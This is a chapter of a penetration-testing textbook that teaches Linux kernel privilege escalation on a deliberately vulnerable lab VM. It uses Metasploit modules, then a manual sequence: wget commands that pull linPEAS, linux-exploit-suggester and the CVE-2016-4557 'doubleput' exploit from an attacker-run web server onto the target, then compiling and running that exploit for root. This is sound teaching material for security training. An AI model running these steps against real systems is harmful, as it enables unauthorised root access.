<html><head></head><body><div id="sbo-rt-content"><div id="_idContainer275">
			<h1 id="_idParaDest-131"><em class="italic"><a id="_idTextAnchor139"/>Chapter 10</em>: Linux Kernel Exploits</h1>
			<p>Now that you have a functional understanding of how to elevate your privileges on Windows systems, we can begin exploring the process of elevating our privileges on Linux systems. The first privilege escalation attack vector we will be exploring in this chapter is kernel exploitation.</p>
			<p>In this chapter, you will learn how to identify, transfer, and utilize kernel exploits on Linux both manually and automatically. This process will mirror the same methodology we used in <a href="B17389_05_Final_PG_ePub.xhtml#_idTextAnchor075"><em class="italic">Chapter 5</em></a>, <em class="italic">Windows Kernel Exploits</em>, where we explored the kernel exploitation process on Windows.</p>
			<p>We will start by taking a look at how the Linux kernel works and how to identify kernel vulnerabilities on Linux by using local enumeration scripts. After this, we will explore the process of modifying, compiling, and transferring kernel exploits to the target system.</p>
			<p>In this chapter, we're going to cover the following main topics:</p>
			<ul>
				<li>Understanding the Linux kernel</li>
				<li>Kernel exploitation with Metasploit</li>
				<li>Manual kernel exploitation</li>
			</ul>
			<h1 id="_idParaDest-132"><a id="_idTextAnchor140"/>Technical requirements </h1>
			<p>To follow along with the demonstrations in this chapter, you will need to ensure that you have familiarity with Linux Terminal commands.</p>
			<p>You can view this chapter's code in action here: <a href="https://bit.ly/3igFnys">https://bit.ly/3igFnys</a></p>
			<h1 id="_idParaDest-133"><a id="_idTextAnchor141"/>Understanding the Linux kernel</h1>
			<p>You should <a id="_idIndexMarker543"/>already have a good idea of how a kernel works as we took an in-depth look at the structure, purpose, and functionality of a kernel in <a href="B17389_05_Final_PG_ePub.xhtml#_idTextAnchor075"><em class="italic">Chapter 5</em></a>, <em class="italic">Windows Kernel Exploits</em>. As a result, we will only be focusing on the structure of the Linux kernel and how it works in this chapter.</p>
			<p>The Linux kernel is a Unix-like open source, monolithic, and modular operating system kernel that was created in 1991 by Linus Torvalds, and was later implemented as the primary kernel for the GNU operating system. This combination of the Linux kernel and the GNU toolchain has led to the development of a plethora of operating systems that use the Linux kernel. These are commonly referred to as Linux distributions. A Linux distribution is an operating system that utilizes the Linux kernel and pairs it with various tools and utilities to cater to a particular use case or industry.</p>
			<p>Similar to <a id="_idIndexMarker544"/>Windows NT, the Linux kernel consists of two main modes of operation that determine access to system resources and hardware:</p>
			<ul>
				<li><strong class="bold">User space</strong>: User <a id="_idIndexMarker545"/>space is a sector of unprivileged segregated memory that's reserved for user programs and services that run outside the operating system kernel. By default, the services are segregated from the kernel and, as a result, will have limited privileges.</li>
				<li><strong class="bold">Kernel space</strong>: The kernel space is a privileged sector of segregated memory that's reserved for running the kernel. The kernel space is privileged, given the nature of the processes and functionality the kernel is responsible for handling.</li>
			</ul>
			<p>As illustrated in the following diagram, the two main modes of operation are used to segregate access to resources and hardware:</p>
			<div>
				<div id="_idContainer252" class="IMG---Figure">
					<img src="Images/B17389_10_001.jpg" alt="Figure 10.1 – Linux kernel structure&#13;&#10;" width="713" height="392"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.1 – Linux kernel structure</p>
			<p>User space applications and services can communicate with the kernel space through the use of system calls, as illustrated in the preceding diagram. The interaction between the user space and kernel space is facilitated through the GNU C library and, consequently, the system call interface.</p>
			<p>The system call interface is responsible for handling system calls from user space into the kernel.</p>
			<p>The kernel space has full access to the system's hardware and resources and is responsible for<a id="_idIndexMarker546"/> managing system services and system calls from the user space.</p>
			<h2 id="_idParaDest-134"><a id="_idTextAnchor142"/>Understanding the Linux kernel exploitation process</h2>
			<p>The Linux<a id="_idIndexMarker547"/> kernel is vulnerable to various attacks that can lead to exploitation or privilege escalation. In this chapter, we will primarily be focusing on how to correctly identify and exploit vulnerabilities in the Linux kernel to elevate our privileges. </p>
			<p>Given the fact that the kernel runs in the privileged kernel space, any vulnerability in the kernel that allows arbitrary code to be executed will run in a privileged state and, as a result, provide us with an elevated session.</p>
			<p>This process will follow a two-pronged approach that will encompass the process of utilizing kernel exploits both manually and automatically. </p>
			<p>Kernel exploits on Linux will typically target vulnerabilities in the Linux kernel to execute arbitrary code. This will help with running privileged system commands or obtaining a system shell. This process will differ based on the version of the Linux kernel being targeted and the kernel exploit being used.</p>
			<p>In this chapter, we will need to set up an Ubuntu 16.04 target virtual machine in our virtual hacking lab.</p>
			<p>We can begin the kernel exploitation process with the Metasploit framework, which will allow us to automate the process of identifying and exploiting kernel vulnerabilities on Windows.</p>
			<h2 id="_idParaDest-135"><a id="_idTextAnchor143"/>Setting up our environment</h2>
			<p>In this <a id="_idIndexMarker548"/>chapter, we will be utilizing a customized Ubuntu 16.04 virtual machine that has been configured to be vulnerable. This will provide us with a robust environment to learn about and demonstrate kernel exploitation.</p>
			<p>To start setting up the virtual machine, follow these steps:</p>
			<ol>
				<li>The first step in this process involves downloading the virtual machine files required to set up the target system with VirtualBox. The necessary file can be downloaded from <a href="https://download.vulnhub.com/stapler/Stapler.zip">https://download.vulnhub.com/stapler/Stapler.zip</a>.</li>
				<li>After downloading the ZIP file, you will need to extract its contents. You should be <a id="_idIndexMarker549"/>presented <a id="_idIndexMarker550"/>with a folder that contains the <strong class="bold">open virtualization format</strong> (<strong class="bold">OVF</strong>) and <strong class="bold">virtual machine disk</strong> (<strong class="bold">VMDK</strong>) files, which are required to run the virtual <a id="_idIndexMarker551"/>machine, as highlighted in the following screenshot:<div id="_idContainer253" class="IMG---Figure"><img src="Images/B17389_10_002.jpg" alt="Figure 10.2 – Virtual machine files&#13;&#10;" width="620" height="107"/></div><p class="figure-caption">Figure 10.2 – Virtual machine files</p></li>
				<li>To import the virtual machine into VirtualBox, you will need to double-click the <strong class="source-inline">Stapler.ovf</strong> file. You will be prompted with the VirtualBox import wizard, as illustrated in the following screenshot:<div id="_idContainer254" class="IMG---Figure"><img src="Images/B17389_10_003.jpg" alt="Figure 10.3 – VirtualBox import wizard&#13;&#10;" width="623" height="463"/></div><p class="figure-caption">Figure 10.3 – VirtualBox import wizard</p><p>The <a id="_idIndexMarker552"/>VirtualBox import wizard will prompt you to specify the virtual machine base folder, as highlighted in the preceding screenshot. After doing this, you can click on the <strong class="bold">Import</strong> button to begin the import process.</p></li>
				<li>Once the virtual machine has been imported into VirtualBox, you will need to add it to the <strong class="bold">Virtual Hacking Lab</strong> network we created in <a href="B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030"><em class="italic">Chapter 2</em></a>, <em class="italic">Setting Up Our Lab</em>, as highlighted in the following screenshot:</li>
			</ol>
			<div>
				<div id="_idContainer255" class="IMG---Figure">
					<img src="Images/B17389_10_004.jpg" alt="Figure 10.4 – VirtualBox network settings&#13;&#10;" width="506" height="358"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.4 – VirtualBox network settings</p>
			<p>Once you have configured the virtual machine to use the custom network, you can save the changes and boot up the VM to get started.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">You will require an initial foothold on the system to follow along with the techniques and demonstrations in this chapter. The following exploitation guide highlights the process of retrieving a meterpreter session on the target VM: <a href="https://download.vulnhub.com/stapler/slides.pdf">https://download.vulnhub.com/stapler/slides.pdf</a>.</p>
			<p>Now that<a id="_idIndexMarker553"/> we have set up our environment and target virtual machine, we can begin the privilege escalation process with Metasploit.</p>
			<h1 id="_idParaDest-136"><a id="_idTextAnchor144"/>Kernel exploitation with Metasploit</h1>
			<p>We can<a id="_idIndexMarker554"/> begin the kernel exploitation process<a id="_idIndexMarker555"/> by taking a look at how to use kernel exploits with the <strong class="bold">Metasploit</strong> framework. The Metasploit framework offers an automated and modularized solution and streamlines the exploitation process.</p>
			<p>For this section, our target system will be the Ubuntu 16.04 virtual machine. As a prerequisite, ensure that you have gained your initial foothold on the system and have a <strong class="bold">meterpreter</strong> session:</p>
			<ol>
				<li value="1">The first step involves scanning the target for potential exploits. For this, we will be using the <strong class="source-inline">local_exploit_suggester</strong> module. This process was covered in depth in the previous chapter. </li>
				<li>We can load the module in Metasploit by running the following command:<p class="source-code"><strong class="bold">use post/multi/recon/local_exploit_suggester</strong></p></li>
				<li>After loading the module, you will need to set the <strong class="source-inline">SESSION</strong> option for the module. The <strong class="source-inline">SESSION</strong> option requires the session ID of your meterpreter session. This can be done by running the following command:<p class="source-code"><strong class="bold">set SESSION &lt;SESSION-ID&gt;</strong></p><p>As illustrated in the following screenshot, the <strong class="source-inline">SESSION</strong> option should reflect the session ID you set:</p><div id="_idContainer256" class="IMG---Figure"><img src="Images/B17389_10_005.jpg" alt="Figure 10.5 – local_exploit_suggester options&#13;&#10;" width="1273" height="247"/></div><p class="figure-caption">Figure 10.5 – local_exploit_suggester options</p></li>
				<li>After<a id="_idIndexMarker556"/> configuring the module <a id="_idIndexMarker557"/>options, we can run the module by running the following command:<p class="source-code"><strong class="bold">run</strong></p><p>This will begin the scanning process, during which the module will begin to output the various exploits that the target is potentially vulnerable to, as highlighted in the following screenshot:</p><div id="_idContainer257" class="IMG---Figure"><img src="Images/B17389_10_006.jpg" alt="Figure 10.6 – local_exploit_suggester results&#13;&#10;" width="1095" height="215"/></div><p class="figure-caption">Figure 10.6 – local_exploit_suggester results</p></li>
				<li>Now, we can begin testing the various exploit modules recommended by <strong class="source-inline">local_exploit_suggester</strong>. The first few modules in the output usually have a higher chance of working successfully. We can test the second module in the list, as highlighted in the preceding screenshot, by loading the module. This can be done by running the following command:<p class="source-code"><strong class="bold">use /exploit/linux/local/netfilter_priv_esc_ipv4</strong></p><p>This kernel exploit will exploit a <strong class="bold">netfilter</strong> bug on Linux kernels before version 4.6.3 and requires <strong class="source-inline">iptables</strong> to be enabled and loaded. The exploit also requires <strong class="source-inline">libc6-dev-i386</strong> for compiling the exploit. More information regarding this exploit can be found here: <a href="https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/">https://www.rapid7.com/db/modules/exploit/linux/local/netfilter_priv_esc_ipv4/</a>.</p></li>
				<li>After <a id="_idIndexMarker558"/>loading the module, you <a id="_idIndexMarker559"/>will need to set the module options, which will include the meterpreter session ID and the payload options for the new meterpreter session, as highlighted in the following screenshot:<div id="_idContainer258" class="IMG---Figure"><img src="Images/B17389_10_007.jpg" alt="Figure 10.7 – Kernel exploit module options" width="1075" height="432"/></div><p class="figure-caption">Figure 10.7 – Kernel exploit module options</p></li>
				<li>We can now run the kernel exploit module by running the following command:<p class="source-code"><strong class="bold">exploit</strong></p><p>In this case, the exploit was unsuccessful because <strong class="source-inline">libc6-dev-i386</strong> is not installed, as seen in the following screenshot:</p></li>
			</ol>
			<div>
				<div id="_idContainer259" class="IMG---Figure">
					<img src="Images/B17389_10_008.jpg" alt="Figure 10.8 – Metasploit kernel exploit failed&#13;&#10;" width="643" height="120"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.8 – Metasploit kernel exploit failed</p>
			<p>Alternatively, running the other kernel exploits suggested by <strong class="source-inline">local_exploit_suggester</strong> will fail. This is an important lesson to learn: you cannot always rely on using automated Metasploit modules to gain access or elevate your privileges on the target system. Trial and error is a big part of the privilege escalation process.</p>
			<p>Given that <a id="_idIndexMarker560"/>this <a id="_idIndexMarker561"/>path has not yielded any results, we will need to take a more manual hands-on approach in identifying the correct kernel exploit to use. Let's begin by taking a look at how to enumerate relevant information from the target system with various enumeration scripts.</p>
			<h1 id="_idParaDest-137"><a id="_idTextAnchor145"/>Manual kernel exploitation</h1>
			<p>In some cases, you<a id="_idIndexMarker562"/> will not be successful in using Metasploit modules to elevate your privileges, you may not have access to a target with a meterpreter session, or you may have exploited the target through a manual exploitation technique such as a web shell. In that case, you will have access through a standard reverse shell, most likely facilitated through <strong class="bold">netcat</strong>. This poses a few issues; how can you scan the target for potential kernel exploits? And how can you transfer over the kernel exploit to the target?</p>
			<p>These are the issues we will be addressing in this section; our target of choice will be the Ubuntu 16.04 virtual machine we set up earlier in this chapter.</p>
			<h2 id="_idParaDest-138"><a id="_idTextAnchor146"/>Local enumeration tools</h2>
			<p>The first step is to scan and identify potential kernel vulnerabilities. This can be done by using <strong class="source-inline">linux-exploit-suggester</strong> or other enumeration scripts and tools. In this case, we will utilize the <strong class="bold">linPEAS</strong> script to enumerate information from our target.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">linPEAS is a local Linux enumeration script that searches and scans for potential vulnerabilities, and then enumerates all important system information that can be used to stage a privilege escalation attack.</p>
			<p>The <strong class="bold">linPEAS</strong> binary can<a id="_idIndexMarker563"/> be downloaded from the following GitHub repository: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a>.</p>
			<p>Ensure you<a id="_idIndexMarker564"/> download the <strong class="source-inline">linpeas</strong> Bash script, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer260" class="IMG---Figure">
					<img src="Images/B17389_10_009.jpg" alt="Figure 10.9 – linPEAS Bash script&#13;&#10;" width="379" height="229"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.9 – linPEAS Bash script</p>
			<p>After downloading the Bash script to our Kali VM, we need to transfer the <strong class="source-inline">linpeas.sh</strong> file to our target virtual machine. This cannot be done automatically as we do not have a meterpreter session. As a result, we will need to make use of Linux-specific utilities to download the binary.</p>
			<h2 id="_idParaDest-139"><a id="_idTextAnchor147"/>Transferring files</h2>
			<p>To <a id="_idIndexMarker565"/>transfer the <strong class="source-inline">linpeas.sh</strong> file to our target, we will need to set up a web server on our Kali VM. This will be used to host the file so that we can download it on the target system. This can be done by following these steps:</p>
			<ol>
				<li value="1">To set up a web server on our Kali VM, we can utilize the <strong class="source-inline">SimpleHTTPServer</strong> Python module to serve the binary file. This can be done by running the following command in the directory where the <strong class="source-inline">linpeas.sh</strong> binary is stored:<p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p><p class="callout-heading">Note</p><p class="callout">You can also use any other open port on your system if port <strong class="source-inline">80</strong> is being used.</p><p>Alternatively, you can utilize the Python 3 <strong class="source-inline">http.server</strong> module by running the following<a id="_idIndexMarker566"/> command:</p><p class="source-code"><strong class="bold">sudo python3 -m http.server 80</strong></p><p>As highlighted in the following screenshot, <strong class="source-inline">SimpleHTTPServer</strong> will serve the files in the directory on the Kali VM IP address on port <strong class="source-inline">80</strong>:</p><div id="_idContainer261" class="IMG---Figure"><img src="Images/B17389_10_010.jpg" alt="Figure 10.10 – SimpleHTTPServer linpeas.sh&#13;&#10;" width="604" height="250"/></div><p class="figure-caption">Figure 10.10 – SimpleHTTPServer linpeas.sh</p></li>
				<li>To download the <strong class="source-inline">linpeas.sh</strong> file on to the target system, we can utilize the <strong class="source-inline">wget</strong> utility. Before we can download the binary, however, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the temporary directory, as illustrated in the following screenshot:<div id="_idContainer262" class="IMG---Figure"><img src="Images/B17389_10_011.jpg" alt="Figure 10.11 – Linux temp directory&#13;&#10;" width="246" height="101"/></div><p class="figure-caption">Figure 10.11 – Linux temp directory</p></li>
				<li>We can now use the <strong class="source-inline">wget</strong> utility to download the file from the Kali VM onto our target system. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">wget http://&lt;KALI-VM-IP&gt;/linpeas.sh</strong></p><p>The output of the preceding command can be seen in the following screenshot:</p></li>
			</ol>
			<div>
				<div id="_idContainer263" class="IMG---Figure">
					<img src="Images/B17389_10_012.jpg" alt="Figure 10.12 – wget successful transfer&#13;&#10;" width="858" height="376"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.12 – wget successful transfer</p>
			<p>As shown in the<a id="_idIndexMarker567"/> preceding screenshot, if the transfer is successful, the <strong class="source-inline">linpeas.sh</strong> file should be downloaded and saved with the name we specified.</p>
			<p>We can now use the <strong class="source-inline">linpeas.sh</strong> script to enumerate important system information that we can use to elevate our privileges.</p>
			<h2 id="_idParaDest-140"><a id="_idTextAnchor148"/>Enumerating system information</h2>
			<p>The <strong class="source-inline">linpeas.sh</strong> script<a id="_idIndexMarker568"/> enumerates a lot of information and will perform various checks to discover potential vulnerabilities on the target system. However, it does not enumerate a list of potential kernel exploits. In the context of kernel exploits, we can use the <strong class="source-inline">linpeas.sh</strong> script to enumerate system information such as the kernel version. This can be done by going through the following steps:</p>
			<ol>
				<li value="1">To enumerate all the important system information, we need to run the <strong class="source-inline">linpeas.sh</strong> script. However, before we do that, we need to ensure the script has executable permissions. This can be done by running the following command on the target:<p class="source-code"><strong class="bold">chmod +x linpeas.sh</strong></p></li>
				<li>We can now run the <strong class="source-inline">linpeas.sh</strong> script by running the following command on the target:<p class="source-code"><strong class="bold">./linpeas.sh -o SysI</strong></p><p>The <strong class="source-inline">SysI</strong> option is used to restrict the results of the script to only system information. This is<a id="_idIndexMarker569"/> primarily because the <strong class="source-inline">linpeas.sh</strong> script will generate a lot of output.</p><p>As shown in the following screenshot, the script will enumerate system information, the kernel version that's been installed, and the Linux distribution release version, as well as the codename:</p></li>
			</ol>
			<div>
				<div id="_idContainer264" class="IMG---Figure">
					<img src="Images/B17389_10_013.jpg" alt="Figure 10.13 – linPEAS system information&#13;&#10;" width="1141" height="192"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.13 – linPEAS system information</p>
			<p>In this case, our target is running Ubuntu 16.04 LTS with kernel version 4.4.0-21 running. We can use this information to identify specific vulnerabilities that affect this version of the kernel. The distribution ID, release version, and codename are also important as some kernel exploits are designed to be run on specific Linux distributions.</p>
			<p>The <strong class="bold">linPEAS</strong> script does not provide us with any potential kernel exploits that can be used to elevate our privileges. As a result, we will have to utilize other enumeration scripts.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">The <strong class="bold">linPEAS</strong> script enumerates a lot of useful information that will be very useful in the later stages of this book as we delve into other Linux privilege escalation techniques.</p>
			<h2 id="_idParaDest-141"><a id="_idTextAnchor149"/>Enumerating kernel exploits</h2>
			<p>We can <a id="_idIndexMarker570"/>utilize <strong class="source-inline">linux-exploit-suggester</strong> to enumerate our system information and scan for potential kernel exploits. The <strong class="source-inline">linux-exploit-suggester</strong> script can be downloaded from <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a>.</p>
			<p>It is recommended that you download the script and rename it with a simpler filename. This can be automated by running the following command:</p>
			<p class="source-code">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh</p>
			<p>After downloading the script, we will need to transfer it over to the target system. This can be done by following these steps:</p>
			<ol>
				<li value="1">To set up a web server on our Kali VM, we can utilize the <strong class="source-inline">SimpleHTTPServer</strong> Python module to serve the binary file. This can be done by running the following command in the directory where the <strong class="source-inline">les.sh</strong> script is stored:<p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p></li>
				<li>To download the <strong class="source-inline">les.sh</strong> script on the target system, we can utilize the <strong class="source-inline">wget</strong> utility. Before we can download the binary, however, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the temporary directory, as illustrated in the following screenshot:<div id="_idContainer265" class="IMG---Figure"><img src="Images/B17389_10_014.jpg" alt="Figure 10.14 – Linux temp directory&#13;&#10;" width="257" height="101"/></div><p class="figure-caption">Figure 10.14 – Linux temp directory</p><p>We can now use the <strong class="source-inline">wget</strong> utility to download the file from the Kali VM to our target system. This can be done by running the following command on the target system:</p><p class="source-code"><strong class="bold">wget http://&lt;KALI-VM-IP&gt;/les.sh</strong></p><p>The output is shown in the following screenshot:</p><div id="_idContainer266" class="IMG---Figure"><img src="Images/B17389_10_015.jpg" alt="Figure 10.15 – wget successful transfer&#13;&#10;" width="841" height="306"/></div><p class="figure-caption">Figure 10.15 – wget successful transfer</p><p>As shown<a id="_idIndexMarker571"/> in the preceding screenshot, if the transfer is successful, the <strong class="source-inline">les.sh</strong> script should be downloaded and saved with the name we specified.</p></li>
				<li>We can now use the <strong class="source-inline">les.sh</strong> script to enumerate potential kernel vulnerabilities that we can use to elevate our privileges. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">./les.sh</strong></p><p>As outlined in the following screenshot, the script will enumerate all potential kernel exploits that can be used to elevate privileges. We can now use this information to determine the correct kernel exploit to use:</p><div id="_idContainer267" class="IMG---Figure"><img src="Images/B17389_10_016.jpg" alt="Figure 10.16 – Linux exploit suggester – kernel exploits&#13;&#10;" width="1305" height="375"/></div><p class="figure-caption">Figure 10.16 – Linux exploit suggester – kernel exploits</p></li>
				<li>It is always recommended to use the first exploit's output with the enumeration tools and scripts. In this case, we will start with the CVE-2016-4557 kernel exploit. We will need to determine more information about the exploit and how it should be used. We can do this by performing a quick Google search, as highlighted<a id="_idIndexMarker572"/> in the following screenshot:<div id="_idContainer268" class="IMG---Figure"><img src="Images/B17389_10_017.jpg" alt="Figure 10.17 – CVE-2016-4557 Google search" width="652" height="397"/></div><p class="figure-caption">Figure 10.17 – CVE-2016-4557 Google search</p><p>The preceding Google search reveals an <strong class="source-inline">exploit-db</strong> reference that contains information regarding the exploit, the exploit's source code, and how it should be used.</p><p>It is always recommended to analyze the source code to ensure that it is not malicious and works as intended. This allows you to make any additional modifications that are required. </p></li>
				<li>Alternatively, we can also use the <strong class="source-inline">exploit-db</strong> command-line utility to query for specific vulnerabilities. This can be done by running the following command in the Kali VM:<p class="source-code"><strong class="bold">searchsploit linux kernel 4.4</strong></p><p>In this case, we are querying the <strong class="source-inline">exploit-db</strong> database for exploits specific to Linux kernel version 4.4.0. As highlighted in the following screenshot, we can identify the same exploit:</p></li>
			</ol>
			<div>
				<div id="_idContainer269" class="IMG---Figure">
					<img src="Images/B17389_10_018.jpg" alt="Figure 10.18 – Searchsploit results&#13;&#10;" width="963" height="73"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.18 – Searchsploit results</p>
			<p>Now that we have identified a potential kernel exploit, we can start transferring the exploit to <a id="_idIndexMarker573"/>the target and execute it.</p>
			<h2 id="_idParaDest-142"><a id="_idTextAnchor150"/>Running the kernel exploit</h2>
			<p>Closer <a id="_idIndexMarker574"/>analysis of the kernel exploit reveals its functionality and any compilation instructions (if needed), as highlighted in the following screenshot: </p>
			<div>
				<div id="_idContainer270" class="IMG---Figure">
					<img src="Images/B17389_10_019.jpg" alt="Figure 10.19 – Exploit instructions&#13;&#10;" width="775" height="163"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.19 – Exploit instructions</p>
			<p>In this particular case, we need to download the ZIP file that contains the compilation script and the exploit binary to the target. After doing this, we will need to run the <strong class="source-inline">doubleput</strong> binary to elevate our session.</p>
			<p>More information regarding this exploit can be found here: <a href="https://www.exploit-db.com/exploits/39772">https://www.exploit-db.com/exploits/39772</a>.</p>
			<p>We can run the kernel exploit by following these steps:</p>
			<ol>
				<li value="1">The first step in this process involves downloading the exploit archive to your Kali VM. This can be done by running the following command:<p class="source-code"><strong class="bold">wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip</strong></p></li>
				<li>After downloading the exploit archive, we will need to transfer it to the target system. This can be done by starting a local web server on the Kali VM with the <strong class="source-inline">SimpleHTTPServer</strong> Python module:<p class="source-code"><strong class="bold">sudo python -m SimpleHTTPServer 80</strong></p></li>
				<li>To download the binary onto the target system, we can utilize the <strong class="source-inline">wget</strong> utility. Before we can download the binary, however, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the temporary directory, as we have done in earlier sections.</li>
				<li>We can <a id="_idIndexMarker575"/>now use the <strong class="source-inline">wget</strong> utility to download the exploit archive from the Kali VM to our target system. This can be done by running the following command on the target system:<p class="source-code"><strong class="bold">wget http://&lt;KALI-VM-IP&gt;/39772.zip</strong></p></li>
				<li>After transferring the exploit archive to the target, we need to extract the archive. This can be done by running the following command:<p class="source-code"><strong class="bold">unzip 39772.zip</strong></p><p>After extracting the exploit archive, you will have a directory named <strong class="source-inline">39772</strong>. Navigating into this directory reveals the following files:</p><div id="_idContainer271" class="IMG---Figure"><img src="Images/B17389_10_020.jpg" alt="Figure 10.20 – Exploit archive contents&#13;&#10;" width="701" height="216"/></div><p class="figure-caption">Figure 10.20 – Exploit archive contents</p></li>
				<li>Now, we need to extract the <strong class="source-inline">exploit.tar</strong> archive. This can be done by running the following command:<p class="source-code"><strong class="bold">tar xf exploit.tar</strong></p><p>After extracting the <strong class="source-inline">exploit.tar</strong> archive, you will be presented with a directory, as highlighted in the following screenshot:</p><div id="_idContainer272" class="IMG---Figure"><img src="Images/B17389_10_021.jpg" alt="Figure 10.21 – Exploit directory&#13;&#10;" width="890" height="238"/></div><p class="figure-caption">Figure 10.21 – Exploit directory</p><p>Navigating<a id="_idIndexMarker576"/> to this directory reveals the compilation script that will generate the exploit binary when executed.</p></li>
				<li>We can run the exploit compilation script by running the following command:<p class="source-code"><strong class="bold">./compile.sh</strong></p><p>The exploit script will generate an exploit binary named <strong class="source-inline">doubleput</strong>, as highlighted in the following screenshot:</p><div id="_idContainer273" class="IMG---Figure"><img src="Images/B17389_10_022.jpg" alt="Figure 10.22 – Exploit binary&#13;&#10;" width="688" height="301"/></div><p class="figure-caption">Figure 10.22 – Exploit binary</p></li>
				<li>As per the exploit execution instructions, we can run the <strong class="source-inline">doubleput</strong> binary to obtain an elevated session. This can be done by running the following command:<p class="source-code"><strong class="bold">./doubleput</strong></p><p>If the exploit binary runs successfully, you should receive an elevated session with root privileges, as highlighted in the following screenshot:</p></li>
			</ol>
			<div>
				<div id="_idContainer274" class="IMG---Figure">
					<img src="Images/B17389_10_023.jpg" alt="Figure 10.23 – Successful manual kernel exploit&#13;&#10;" width="969" height="261"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.23 – Successful manual kernel exploit</p>
			<p>With that, we<a id="_idIndexMarker577"/> have been able to successfully elevate our privileges on the target Linux VM by leveraging vulnerabilities in the Linux kernel. Now, we can begin exploring other Linux privilege escalation vectors.</p>
			<h1 id="_idParaDest-143"><a id="_idTextAnchor151"/>Summary</h1>
			<p>In this chapter, we started by identifying and running kernel exploits automatically with the Metasploit framework. We then looked at how to identify and transfer kernel exploits manually. We ended this chapter by taking a look at how to execute kernel exploits on the target system successfully to elevate our privileges.</p>
			<p>Now that we have learned how to perform kernel exploitation on Linux systems, we can begin exploring other Linux privilege escalation vectors.</p>
			<p>In the next chapter, we will explore the process of mining and searching for locally stored passwords on Linux and how this can lead to successful privilege escalation. </p>
		</div>
	</div></body></html>